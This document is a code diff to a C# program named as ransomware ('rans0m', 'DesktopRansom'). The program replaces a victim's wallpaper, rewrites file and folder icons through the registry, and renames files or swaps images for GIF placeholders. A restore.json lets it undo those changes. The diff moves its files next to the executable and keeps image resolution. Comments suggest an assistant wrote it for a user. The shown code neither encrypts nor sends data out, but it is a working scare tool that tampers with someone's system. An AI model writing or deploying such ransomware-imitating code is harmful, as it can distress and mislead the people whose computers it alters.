@@ -9,15 +9,14 @@ namespace rans0m
     {
         private static readonly object _lock = new();
         private static readonly string ExeDir = AppContext.BaseDirectory.TrimEnd(Path.DirectorySeparatorChar, Path.AltDirectorySeparatorChar);
-        // User requested file:///C:/Ransom_A-90/Random_A-90.gif (exe resides in C:/Ransom_A-90)
-        // We support both local path and file URI
+        // All sidecar files live next to the exe, wherever it runs from -
+        // the build is a standalone single file, so nothing may assume a
+        // fixed folder. GifUri is the file:// form of GifLocalPath.
         public static string GifLocalPath => Path.Combine(ExeDir, "Random_A-90.gif");
-        public static string GifUri => "file:///C:/Ransom_A-90/Random_A-90.gif";
-        // Alternative local that matches URI
-        public static string GifUriLocalPath => @"C:\Ransom_A-90\Random_A-90.gif";
+        public static string GifUri => "file:///" + ExeDir.Replace('\\', '/').TrimEnd('/') + "/Random_A-90.gif";
+        public static string GifUriLocalPath => GifLocalPath;
         public static string JsonPath => Path.Combine(ExeDir, "restore.json");
-        // Also check alternate location as user typed
-        public static string JsonAltPath => @"C:\Ransom_A-90\restore.json";
+        public static string JsonAltPath => JsonPath;
 
         private static readonly string[] ImageExtensions = new[] { ".jpg", ".jpeg", ".png", ".bmp", ".gif", ".webp", ".tiff", ".ico" };
         private static readonly string[] SystemCriticalProcesses = new[] { "csrss", "wininit", "services", "lsass", "winlogon", "smss", "svchost", "explorer", "System", "Registry", "MemCompression" };
@@ -31,7 +30,19 @@ namespace rans0m
         [DllImport("shell32.dll")]
         private static extern void SHChangeNotify(uint wEventId, uint uFlags, IntPtr dwItem1, IntPtr dwItem2);
         private const uint SHCNE_ASSOCCHANGED = 0x08000000;
+        private const uint SHCNE_UPDATEDIR = 0x00001000;
+        private const uint SHCNE_UPDATEITEM = 0x00002000;
         private const uint SHCNF_IDLIST = 0x0000;
+        private const uint SHCNF_PATHW = 0x0005;
+
+        [DllImport("shell32.dll", CharSet = CharSet.Unicode)]
+        private static extern void SHChangeNotify(uint wEventId, uint uFlags, string dwItem1, IntPtr dwItem2);
+
+        private static void RefreshFolderIcons(string desktop)
+        {
+            try { SHChangeNotify(SHCNE_ASSOCCHANGED, SHCNF_IDLIST, IntPtr.Zero, IntPtr.Zero); } catch { }
+            try { SHChangeNotify(SHCNE_UPDATEDIR, SHCNF_PATHW, desktop, IntPtr.Zero); } catch { }
+        }
 
         [DllImport("user32.dll", CharSet = CharSet.Auto)]
         private static extern IntPtr SendMessage(IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam);
@@ -89,6 +100,8 @@ namespace rans0m
         public class WallpaperBackup
         {
             public string? OriginalWallpaper { get; set; }
+            public string? OriginalStyle { get; set; }
+            public string? OriginalTile { get; set; }
         }
 
         private static bool IsImage(string path) => ImageExtensions.Contains(Path.GetExtension(path).ToLowerInvariant());
@@ -97,11 +110,7 @@ namespace rans0m
         {
             try
             {
-                string[] candidates = new[] { GifLocalPath, GifUriLocalPath };
-                foreach (var p in candidates.Distinct())
-                {
-                    if (File.Exists(p)) return;
-                }
+                if (File.Exists(GifLocalPath)) return;
                 try
                 {
                     Directory.CreateDirectory(Path.GetDirectoryName(GifLocalPath) ?? ExeDir);
@@ -119,15 +128,6 @@ namespace rans0m
                         byte[] gif = Convert.FromBase64String("R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7");
                         fs.Write(gif, 0, gif.Length);
                     }
-                    try
-                    {
-                        if (!File.Exists(GifUriLocalPath) && File.Exists(GifLocalPath))
-                        {
-                            Directory.CreateDirectory(Path.GetDirectoryName(GifUriLocalPath) ?? @"C:\");
-                            File.Copy(GifLocalPath, GifUriLocalPath, true);
-                        }
-                    }
-                    catch { }
                     Debug.WriteLine($"[DesktopRansom] Gif ensured at {GifLocalPath}");
                 }
                 catch (Exception ex) { Debug.WriteLine($"[DesktopRansom] EnsureGif failed: {ex.Message}"); }
@@ -135,7 +135,8 @@ namespace rans0m
             catch { }
         }
 
-        // GIF cannot be used directly as icon/wallpaper (Windows expects ICO/BMP). Convert first frame to ICO/BMP.
+        // Preserve resolution: never upscale or stretch. ICO keeps source aspect with
+        // high-quality downscale only; BMP keeps native gif dimensions 1:1.
         public static string EnsureIcoExists(string gifPath)
         {
             try
@@ -143,13 +144,29 @@ namespace rans0m
                 string icoPath = Path.ChangeExtension(gifPath, ".ico");
                 if (File.Exists(icoPath)) return icoPath;
                 using var img = Image.FromFile(gifPath);
-                using var bmp = new Bitmap(img, new Size(256, 256));
+                int srcW = img.Width, srcH = img.Height;
+                // Keep aspect, fit inside 256 without upscaling
+                int target = Math.Min(256, Math.Max(srcW, srcH));
+                if (target <= 0) target = 256;
+                double scale = Math.Min((double)target / Math.Max(1, srcW), (double)target / Math.Max(1, srcH));
+                if (scale > 1.0) scale = 1.0; // never upscale = no fake res loss
+                int dw = Math.Max(1, (int)(srcW * scale));
+                int dh = Math.Max(1, (int)(srcH * scale));
+                using var bmp = new Bitmap(dw, dh, System.Drawing.Imaging.PixelFormat.Format32bppArgb);
+                using (var g = Graphics.FromImage(bmp))
+                {
+                    g.InterpolationMode = System.Drawing.Drawing2D.InterpolationMode.HighQualityBicubic;
+                    g.SmoothingMode = System.Drawing.Drawing2D.SmoothingMode.HighQuality;
+                    g.PixelOffsetMode = System.Drawing.Drawing2D.PixelOffsetMode.HighQuality;
+                    g.Clear(Color.Transparent);
+                    g.DrawImage(img, 0, 0, dw, dh);
+                }
                 IntPtr hIcon = bmp.GetHicon();
                 using var icon = Icon.FromHandle(hIcon);
                 using var fs = new FileStream(icoPath, FileMode.Create);
                 icon.Save(fs);
                 try { DestroyIcon(hIcon); } catch { }
-                Debug.WriteLine($"[DesktopRansom] ICO created at {icoPath}");
+                Debug.WriteLine($"[DesktopRansom] ICO created at {icoPath} ({dw}x{dh} from {srcW}x{srcH}, no upscale)");
                 return icoPath;
             }
             catch (Exception ex) { Debug.WriteLine($"[DesktopRansom] EnsureIco fail: {ex.Message}"); return gifPath; }
@@ -160,11 +177,13 @@ namespace rans0m
             try
             {
                 string bmpPath = Path.ChangeExtension(gifPath, ".bmp");
-                if (File.Exists(bmpPath)) return bmpPath;
+                // Regenerate only if gif is newer, else keep existing to avoid recompress loss
+                if (File.Exists(bmpPath) && File.GetLastWriteTimeUtc(bmpPath) >= File.GetLastWriteTimeUtc(gifPath)) return bmpPath;
                 using var img = Image.FromFile(gifPath);
-                // Select first frame
+                // Native dimensions only - no resize, no res loss
+                Debug.WriteLine($"[DesktopRansom] BMP source {img.Width}x{img.Height}, saving native");
                 img.Save(bmpPath, System.Drawing.Imaging.ImageFormat.Bmp);
-                Debug.WriteLine($"[DesktopRansom] BMP created at {bmpPath}");
+                Debug.WriteLine($"[DesktopRansom] BMP created at {bmpPath} (native, no resize)");
                 return bmpPath;
             }
             catch (Exception ex) { Debug.WriteLine($"[DesktopRansom] EnsureBmp fail: {ex.Message}"); return gifPath; }
@@ -413,24 +432,36 @@ namespace rans0m
                         catch (Exception ex) { Debug.WriteLine($"[DesktopRansom] Folder {dir} icon fail: {ex.Message}"); }
                     }
 
-                    // 4) Wallpaper change - GIF not supported as wallpaper (needs BMP). Use BMP derived from GIF.
+                    // 4) Wallpaper change - BMP at native gif res, keep user's style so no res/style loss.
                     try
                     {
                         string? currentWallpaper = null;
+                        string? origStyle = null, origTile = null;
                         try
                         {
                             using var k = Registry.CurrentUser.OpenSubKey(@"Control Panel\Desktop");
                             currentWallpaper = k?.GetValue("Wallpaper") as string;
+                            origStyle = k?.GetValue("WallpaperStyle") as string;
+                            origTile = k?.GetValue("TileWallpaper") as string;
                         }
                         catch { }
-                        data.Wallpaper = new WallpaperBackup { OriginalWallpaper = currentWallpaper };
+                        data.Wallpaper = new WallpaperBackup { OriginalWallpaper = currentWallpaper, OriginalStyle = origStyle, OriginalTile = origTile };
                         try
                         {
-                            // Use BMP for wallpaper (SPI_SETDESKWALLPAPER expects BMP; GIF will not animate)
-                            string wallPath = bmpPath; // BMP from GIF first frame
+                            string wallPath = bmpPath; // BMP native, no resize
+                            // Preserve style: keep user's style if present, else Fill(10)/no-tile so image isn't stretched down
+                            try
+                            {
+                                using var wk = Registry.CurrentUser.CreateSubKey(@"Control Panel\Desktop");
+                                if (wk != null)
+                                {
+                                    if (string.IsNullOrEmpty(origStyle)) wk.SetValue("WallpaperStyle", "10");
+                                    if (string.IsNullOrEmpty(origTile)) wk.SetValue("TileWallpaper", "0");
+                                }
+                            }
+                            catch { }
                             SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, wallPath, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
-                            Debug.WriteLine($"[DesktopRansom] Wallpaper set to {wallPath} (BMP from GIF)");
-                            // Note: Animated GIF wallpaper not natively supported. For animation, would need to spawn a fullscreen borderless window playing GIF via PictureBox + ImageAnimator, or cycle frames via multiple BMPs with timer. Spawning multiple instances to change frames would work but is heavy (requires timer + SHChangeNotify + registry churn). GIF as icon/wallpaper is static by design in Windows.
+                            Debug.WriteLine($"[DesktopRansom] Wallpaper set to {wallPath} (native BMP, style preserved)");
                         }
                         catch (Exception ex) { Debug.WriteLine($"[DesktopRansom] Wallpaper set fail: {ex.Message}"); }
                     }
@@ -452,15 +483,8 @@ namespace rans0m
                         File.WriteAllText(tmp, json);
                         if (File.Exists(JsonPath)) File.Delete(JsonPath);
                         File.Move(tmp, JsonPath);
-                        // Also copy to alt path for C:/Ransom_A-90
-                        try
-                        {
-                            Directory.CreateDirectory(Path.GetDirectoryName(JsonAltPath) ?? @"C:\");
-                            File.Copy(JsonPath, JsonAltPath, true);
-                        }
-                        catch { }
-                        Debug.WriteLine($"[DesktopRansom] Json saved with {data.Renames.Count} renames, {data.IconBackups.Count} icons");
-                        try { SHChangeNotify(SHCNE_ASSOCCHANGED, SHCNF_IDLIST, IntPtr.Zero, IntPtr.Zero); } catch { }
+                        Debug.WriteLine($"[DesktopRansom] Json saved with {data.Renames.Count} renames, {data.IconBackups.Count} icons, {data.FolderBackups.Count} folders");
+                        try { RefreshFolderIcons(desktop); } catch { }
                     }
                     catch (Exception ex) { Debug.WriteLine($"[DesktopRansom] Save json fail: {ex.Message}"); }
                 }
@@ -492,8 +516,8 @@ namespace rans0m
                 }
 
                 using var ck = Registry.CurrentUser.CreateSubKey(keyPath);
-                // Use file URI? User requested file:///C:/Ransom_A-90/Random_A-90.gif - we will set local path for practicality, but also support URI.
-                // We'll set local path: gifPath
+                // Icon targets are local .ico paths next to the exe (a file:// URI
+                // is not a valid icon source for the shell).
                 ck?.SetValue("", gifPath);
                 Debug.WriteLine($"[DesktopRansom] Icon set {keyPath} -> {gifPath}");
             }
@@ -516,15 +540,25 @@ namespace rans0m
                     var data = JsonSerializer.Deserialize<RestoreData>(json);
                     if (data == null) throw new InvalidDataException("deserialize null");
 
-                    // 1) Restore wallpaper
-                    if (data.Wallpaper?.OriginalWallpaper != null)
+                    // 1) Restore wallpaper + style exactly (no res loss)
+                    if (data.Wallpaper != null)
                     {
                         try
                         {
-                            string orig = data.Wallpaper.OriginalWallpaper;
+                            try
+                            {
+                                using var wk = Registry.CurrentUser.CreateSubKey(@"Control Panel\Desktop");
+                                if (wk != null)
+                                {
+                                    if (data.Wallpaper.OriginalStyle != null) wk.SetValue("WallpaperStyle", data.Wallpaper.OriginalStyle);
+                                    if (data.Wallpaper.OriginalTile != null) wk.SetValue("TileWallpaper", data.Wallpaper.OriginalTile);
+                                }
+                            }
+                            catch { }
+                            string orig = data.Wallpaper.OriginalWallpaper ?? "";
                             if (File.Exists(orig) || string.IsNullOrEmpty(orig))
                             {
-                                SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, orig ?? "", SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
+                                SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, orig, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
                                 Debug.WriteLine($"[DesktopRansom] Wallpaper restored to {orig}");
                             }
                         }
@@ -625,7 +659,7 @@ namespace rans0m
                         }
                         catch (Exception ex) { Debug.WriteLine($"[DesktopRansom] Icon restore {ib.KeyPath} fail: {ex.Message}"); }
                     }
-                    try { SHChangeNotify(SHCNE_ASSOCCHANGED, SHCNF_IDLIST, IntPtr.Zero, IntPtr.Zero); } catch { }
+                    try { RefreshFolderIcons(data.DesktopPath); } catch { }
 
                     // 4) Restore image gif copies (delete gif placeholders)
                     foreach (var ib in data.ImageBackups)
@@ -672,9 +706,6 @@ namespace rans0m
                     try
                     {
                         File.Delete(jp);
-                        // Delete alt too
-                        if (File.Exists(JsonAltPath) && !jp.Equals(JsonAltPath, StringComparison.OrdinalIgnoreCase))
-                            File.Delete(JsonAltPath);
                         Debug.WriteLine("[DesktopRansom] Restore complete, json deleted");
                     }
                     catch (Exception ex) { Debug.WriteLine($"[DesktopRansom] Delete json fail: {ex.Message}"); }
